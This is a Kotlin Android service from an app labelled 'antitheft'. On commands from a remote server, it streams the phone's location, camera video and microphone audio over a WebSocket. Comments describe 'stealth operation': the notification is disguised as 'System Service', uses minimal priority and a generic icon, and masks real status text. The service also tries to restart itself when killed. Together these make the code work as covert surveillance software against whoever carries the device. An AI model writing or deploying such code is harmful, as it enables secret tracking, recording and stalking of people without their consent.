package com.antitheft.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import com.antitheft.R
import com.antitheft.media.AudioRecorder
import com.antitheft.media.CameraManager
import com.antitheft.media.LocationProvider
import com.antitheft.media.LocationData
import com.antitheft.network.NetworkCallback
import com.antitheft.network.NetworkMonitor
import com.antitheft.network.WebSocketCallbacks
import com.antitheft.network.WebSocketClient
import com.antitheft.receiver.ServiceRestartReceiver
import com.antitheft.ui.MainActivity
import com.antitheft.utils.Constants
import com.antitheft.utils.PermissionHelper
import com.antitheft.utils.PreferencesManager
import com.antitheft.worker.CheckInWorker

/**
 * Foreground service that handles location, video, and audio tracking
 * Runs when activated by server check-in response
 * Uses LifecycleService to support CameraX lifecycle binding
 */
class TrackingService : LifecycleService(), WebSocketCallbacks, NetworkCallback {

    // Media capture components
    private var locationProvider: LocationProvider? = null
    private var cameraManager: CameraManager? = null
    private var audioRecorder: AudioRecorder? = null

    // Networking components
    private lateinit var prefsManager: PreferencesManager
    private var webSocketClient: WebSocketClient? = null
    private var networkMonitor: NetworkMonitor? = null
    // Per-service active flags — checked by data send handlers
    private var isLocationActive = false
    private var isAudioActive = false
    private var isCameraActive = false

    // Per-service command flags — persist across reconnections so a stopped
    // service stays stopped after WebSocket reconnect
    private var isLocationStoppedByCommand = false
    private var isAudioStoppedByCommand = false
    private var isCameraStoppedByCommand = false

    // Main thread handler — WebSocket callbacks arrive on OkHttp threads,
    // but Android lifecycle/media operations must run on the main thread
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        Log.d(TAG, "TrackingService created")
        createNotificationChannel()

        // Initialize PreferencesManager
        prefsManager = PreferencesManager(this)

        // Initialize WebSocket client
        webSocketClient = WebSocketClient(prefsManager, this)

        // Initialize and start network monitor
        networkMonitor = NetworkMonitor(this, this)
        networkMonitor?.startMonitoring()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.i(TAG, "TrackingService started")

        // Start as foreground service with notification
        val notification = createNotification("Connecting to server...")
        startForeground(Constants.NOTIFICATION_ID, notification)

        // Check if all required permissions are granted
        if (!PermissionHelper.hasAllPermissions(this)) {
            Log.e(TAG, "Missing required permissions. Cannot start tracking.")
            stopSelf()
            return START_NOT_STICKY
        }

        // Cancel rapid polling — tracking service is taking over
        CheckInWorker.cancelRapidPolling(this)

        // Connect to WebSocket server
        webSocketClient?.connect()
        Log.i(TAG, "Connecting to WebSocket server...")

        // Media capture will start after WebSocket connects (onConnected callback)

        return START_STICKY
    }

    /**
     * Initializes and starts all media capture components.
     * Each component is wrapped in its own try-catch so a single failure
     * doesn't prevent the others from starting.
     */
    private fun startMediaCapture() {
        // Release any existing instances to avoid duplicates
        stopMediaCapture()

        startLocationStreaming()
        startCameraStreaming()
        startAudioStreaming()

        val count = listOf(isLocationActive, isCameraActive, isAudioActive).count { it }
        Log.i(TAG, "Media capture initialized: $count/3 components started")
    }

    /**
     * Handles location updates from LocationProvider
     * Sends location data to server via WebSocket
     */
    private fun handleLocationUpdate(locationData: LocationData) {
        Log.d(TAG, "Location: ${locationData.latitude}, ${locationData.longitude} (accuracy: ${locationData.accuracy}m)")

        if (isLocationActive && webSocketClient?.isConnected() == true) {
            webSocketClient?.sendLocation(locationData)
        }
    }

    /**
     * Handles video frames from CameraManager
     * Sends video frames to server via WebSocket
     */
    private fun handleVideoFrame(frameData: ByteArray) {
        Log.d(TAG, "Video frame captured: ${frameData.size} bytes")

        if (isCameraActive && webSocketClient?.isConnected() == true) {
            webSocketClient?.sendVideoFrame(frameData)
        }
    }

    /**
     * Handles audio chunks from AudioRecorder
     * Sends audio chunks to server via WebSocket
     */
    private fun handleAudioChunk(audioData: ByteArray) {
        Log.d(TAG, "Audio chunk captured: ${audioData.size} bytes")

        if (isAudioActive && webSocketClient?.isConnected() == true) {
            webSocketClient?.sendAudioChunk(audioData)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        Log.i(TAG, "TrackingService stopped")

        // Stop streaming
        isLocationActive = false
        isAudioActive = false
        isCameraActive = false

        // Stop network monitoring
        networkMonitor?.stopMonitoring()
        networkMonitor = null

        // Disconnect WebSocket
        webSocketClient?.disconnect(allowReconnect = false)
        webSocketClient = null

        // Stop all media capture components
        stopMediaCapture()

        // Send restart broadcast to attempt service restart
        val restartIntent = Intent(this, ServiceRestartReceiver::class.java)
        restartIntent.action = "com.antitheft.RESTART_SERVICE"
        sendBroadcast(restartIntent)
        Log.d(TAG, "Service restart broadcast sent")
    }

    /**
     * Stops and releases all media capture components
     */
    private fun stopMediaCapture() {
        try {
            // Stop camera capture
            isCameraActive = false
            cameraManager?.stopCapture()
            cameraManager?.release()
            cameraManager = null

            // Stop audio recording
            isAudioActive = false
            audioRecorder?.stopRecording()
            audioRecorder = null

            // Stop location updates
            isLocationActive = false
            locationProvider?.stopLocationUpdates()
            locationProvider = null

            Log.i(TAG, "All media capture components stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping media capture", e)
        }
    }

    /**
     * Creates notification channel for Android O and above
     * Required for foreground services on Android 8.0+
     * Uses disguised settings for stealth operation
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                Constants.NOTIFICATION_CHANNEL_ID,
                Constants.NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_MIN  // Minimize importance for stealth
            ).apply {
                description = Constants.NOTIFICATION_CHANNEL_DESCRIPTION
                setShowBadge(false)
                setSound(null, null)  // No sound
                enableVibration(false)  // No vibration
            }

            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
            Log.d(TAG, "Notification channel created")
        }
    }

    /**
     * Creates the foreground notification
     * Uses disguised text and icons for stealth operation
     */
    private fun createNotification(statusText: String = "Running"): Notification {
        // Create intent to open MainActivity when notification is tapped
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, Constants.NOTIFICATION_CHANNEL_ID)
            .setContentTitle("System Service")  // Disguised title
            .setContentText(statusText)
            .setSmallIcon(android.R.drawable.ic_dialog_info)  // Generic info icon
            .setContentIntent(pendingIntent)
            .setOngoing(true)  // Notification cannot be dismissed
            .setPriority(NotificationCompat.PRIORITY_MIN)  // Minimize visibility
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSound(null)  // No sound
            .setVibrate(null)  // No vibration
            .setShowWhen(false)  // Don't show timestamp
            .build()
    }

    /**
     * Updates the foreground notification with new status text
     * Maps specific status messages to generic disguised text
     */
    private fun updateNotification(statusText: String) {
        // Map specific status messages to generic disguised text
        val disguisedText = when {
            statusText.contains("Connecting", ignoreCase = true) -> "Initializing..."
            statusText.contains("Connected", ignoreCase = true) -> "Active"
            statusText.contains("Streaming", ignoreCase = true) -> "Running"
            statusText.contains("Disconnected", ignoreCase = true) -> "Standby"
            statusText.contains("Reconnecting", ignoreCase = true) -> "Reconnecting..."
            statusText.contains("error", ignoreCase = true) -> "Processing"
            statusText.contains("Network", ignoreCase = true) -> "Standby"
            statusText.contains("Stopped", ignoreCase = true) -> "Stopped"
            statusText.contains("Waiting", ignoreCase = true) -> "Standby"
            else -> "Running"
        }

        val notification = createNotification(disguisedText)
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(Constants.NOTIFICATION_ID, notification)
    }

    // ==================== WebSocket Callbacks ====================
    // All callbacks are dispatched to the main thread because OkHttp delivers
    // them on its own background threads, but Android lifecycle/media/notification
    // operations must run on the main thread.

    override fun onConnected() {
        Log.i(TAG, "WebSocket connected successfully")
        mainHandler.post { updateNotification("Connected - Waiting for registration...") }
    }

    override fun onRegistered() {
        Log.i(TAG, "Device registered with server")
        mainHandler.postDelayed({
            if (isLocationStoppedByCommand && isAudioStoppedByCommand && isCameraStoppedByCommand) {
                Log.i(TAG, "All services stopped by command — skipping restart after reconnection")
                updateNotification("All services stopped")
            } else {
                Log.i(TAG, "Starting media capture after registration (respecting per-service stops)")
                // Only start services that were NOT stopped by command
                if (!isLocationStoppedByCommand) startLocationStreaming()
                if (!isAudioStoppedByCommand) startAudioStreaming()
                if (!isCameraStoppedByCommand) startCameraStreaming()
                updateNotification(buildActiveServicesText())
            }
        }, 500) // Brief delay lets the service lifecycle fully stabilize
    }

    override fun onDisconnected(reason: String) {
        Log.w(TAG, "WebSocket disconnected: $reason")
        mainHandler.post {
            updateNotification("Disconnected - Will reconnect...")
            isLocationActive = false
            isAudioActive = false
            isCameraActive = false
            // Release hardware so the green camera/mic indicator turns off
            stopMediaCapture()
        }
    }

    override fun onConnectionError(error: String) {
        Log.e(TAG, "WebSocket connection error: $error")
        mainHandler.post {
            updateNotification("Connection error - Retrying...")
            isLocationActive = false
            isAudioActive = false
            isCameraActive = false
        }
    }

    override fun onReconnecting(attempt: Int, delayMs: Long) {
        Log.i(TAG, "Reconnecting (attempt $attempt) in ${delayMs}ms...")
        mainHandler.post {
            updateNotification("Reconnecting (attempt $attempt)...")
            isLocationActive = false
            isAudioActive = false
            isCameraActive = false
        }
    }

    override fun onMaxReconnectAttemptsReached() {
        Log.e(TAG, "Max reconnection attempts reached - Stopping service")
        mainHandler.post {
            updateNotification("Connection failed - Stopping")
            stopSelf()
        }
    }

    override fun onActivationChanged(activated: Boolean) {
        Log.i(TAG, "Activation state changed: $activated")
        if (!activated) {
            Log.i(TAG, "Tracking deactivated by server - Stopping service")
            mainHandler.post { stopSelf() }
        } else if (!isLocationActive && !isAudioActive && !isCameraActive) {
            Log.i(TAG, "Tracking re-activated by server - Resuming all media streaming")
            mainHandler.post {
                isLocationStoppedByCommand = false
                isAudioStoppedByCommand = false
                isCameraStoppedByCommand = false
                startMediaStreaming()
            }
        }
    }

    override fun onStopCommand() {
        Log.i(TAG, "Received stop media services command from server")
        mainHandler.post { stopMediaStreaming() }
    }

    override fun onStartCommand() {
        Log.i(TAG, "Received start media services command from server")
        mainHandler.post { startMediaStreaming() }
    }

    override fun onStopService(service: String) {
        Log.i(TAG, "Received stop command for service: $service")
        mainHandler.post {
            when (service) {
                "location" -> stopLocationStreaming()
                "audio" -> stopAudioStreaming()
                "camera" -> stopCameraStreaming()
                else -> Log.w(TAG, "Unknown service: $service")
            }
            updateNotification(buildActiveServicesText())
            webSocketClient?.sendCommandAck("stop", success = true, service = service)
        }
    }

    override fun onStartService(service: String) {
        Log.i(TAG, "Received start command for service: $service")
        mainHandler.post {
            when (service) {
                "location" -> startLocationStreaming()
                "audio" -> startAudioStreaming()
                "camera" -> startCameraStreaming()
                else -> Log.w(TAG, "Unknown service: $service")
            }
            updateNotification(buildActiveServicesText())
            webSocketClient?.sendCommandAck("start", success = true, service = service)
        }
    }

    /**
     * Stops all media capture (location, video, audio) but keeps service running
     */
    private fun stopMediaStreaming() {
        Log.i(TAG, "🛑 stopMediaStreaming() — stopping all services")

        stopLocationStreaming()
        stopAudioStreaming()
        stopCameraStreaming()

        updateNotification("All services stopped")

        webSocketClient?.sendCommandAck("stop", success = true)
    }

    /**
     * Restarts all media capture (location, video, audio)
     */
    private fun startMediaStreaming() {
        Log.i(TAG, "▶ startMediaStreaming() — starting all services")

        startLocationStreaming()
        startAudioStreaming()
        startCameraStreaming()

        updateNotification(buildActiveServicesText())

        webSocketClient?.sendCommandAck("start", success = true)
    }

    // ==================== Per-Service Start/Stop ====================

    private fun stopLocationStreaming() {
        isLocationActive = false
        isLocationStoppedByCommand = true
        locationProvider?.stopLocationUpdates()
        locationProvider = null
        Log.i(TAG, "Location streaming stopped")
    }

    private fun startLocationStreaming() {
        isLocationStoppedByCommand = false
        isLocationActive = true
        try {
            locationProvider = LocationProvider(this).apply {
                if (checkPermissions()) {
                    startLocationUpdates { handleLocationUpdate(it) }
                    Log.i(TAG, "Location streaming started")
                } else {
                    Log.e(TAG, "Location permissions not granted")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start location streaming", e)
        }
    }

    private fun stopAudioStreaming() {
        isAudioActive = false
        isAudioStoppedByCommand = true
        audioRecorder?.stopRecording()
        audioRecorder = null
        Log.i(TAG, "Audio streaming stopped")
    }

    private fun startAudioStreaming() {
        isAudioStoppedByCommand = false
        isAudioActive = true
        try {
            audioRecorder = AudioRecorder(this).apply {
                if (checkPermissions()) {
                    startRecording { handleAudioChunk(it) }
                    Log.i(TAG, "Audio streaming started")
                } else {
                    Log.e(TAG, "Audio permission not granted")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start audio streaming", e)
        }
    }

    private fun stopCameraStreaming() {
        isCameraActive = false
        isCameraStoppedByCommand = true
        cameraManager?.stopCapture()
        cameraManager?.release()
        cameraManager = null
        Log.i(TAG, "Camera streaming stopped")
    }

    private fun startCameraStreaming() {
        isCameraStoppedByCommand = false
        isCameraActive = true
        try {
            cameraManager = CameraManager(this).apply {
                if (checkPermissions()) {
                    startCapture(this@TrackingService) { handleVideoFrame(it) }
                    Log.i(TAG, "Camera streaming started")
                } else {
                    Log.e(TAG, "Camera permission not granted")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start camera streaming", e)
        }
    }

    /**
     * Builds notification text showing which services are currently active
     */
    private fun buildActiveServicesText(): String {
        val active = mutableListOf<String>()
        if (isLocationActive) active.add("Location")
        if (isAudioActive) active.add("Audio")
        if (isCameraActive) active.add("Camera")

        return if (active.isEmpty()) "All services stopped"
        else "Active: ${active.joinToString(", ")}"
    }

    override fun onServerError(error: String) {
        Log.e(TAG, "Server error: $error")
        updateNotification("Server error: $error")
    }

    // ==================== End of WebSocket Callbacks ====================

    // ==================== Network Callbacks ====================

    override fun onNetworkAvailable() {
        Log.i(TAG, "Network available - Attempting WebSocket reconnection")
        updateNotification("Network restored - Reconnecting...")

        // Attempt to reconnect WebSocket if not already connected
        if (webSocketClient?.isConnected() == false) {
            webSocketClient?.connect()
        }
    }

    override fun onNetworkLost() {
        Log.w(TAG, "Network lost")
        updateNotification("Network lost - Waiting for connection...")

        // Pause streaming
        isLocationActive = false
        isAudioActive = false
        isCameraActive = false
    }

    override fun onNetworkUnavailable() {
        Log.w(TAG, "Network unavailable")
        updateNotification("No network connection")

        // Pause streaming
        isLocationActive = false
        isAudioActive = false
        isCameraActive = false
    }

    override fun onNetworkTypeChanged(type: String) {
        Log.i(TAG, "Network type changed to: $type")
        // No action needed, just log the change
    }

    // ==================== End of Network Callbacks ====================

    companion object {
        private const val TAG = "TrackingService"

        @Volatile
        var isRunning = false
            private set

        /**
         * Starts the TrackingService as a foreground service
         * @param context Application context
         */
        fun start(context: Context) {
            val intent = Intent(context, TrackingService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
            Log.i(TAG, "TrackingService start requested")
        }

        /**
         * Stops the TrackingService
         * @param context Application context
         */
        fun stop(context: Context) {
            val intent = Intent(context, TrackingService::class.java)
            context.stopService(intent)
            Log.i(TAG, "TrackingService stop requested")
        }
    }
}
